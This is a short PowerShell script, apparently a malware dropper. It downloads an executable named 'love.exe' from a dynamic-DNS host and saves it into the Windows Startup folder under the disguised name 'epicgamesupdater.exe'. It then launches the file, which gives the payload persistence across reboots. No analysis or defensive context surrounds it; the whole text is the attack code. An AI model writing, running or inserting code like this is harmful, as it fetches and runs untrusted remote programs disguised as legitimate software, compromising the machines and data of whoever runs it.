$url = "http://fcsab.ddns.net:3010/love.exe"
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
Start-Process -FilePath $dest
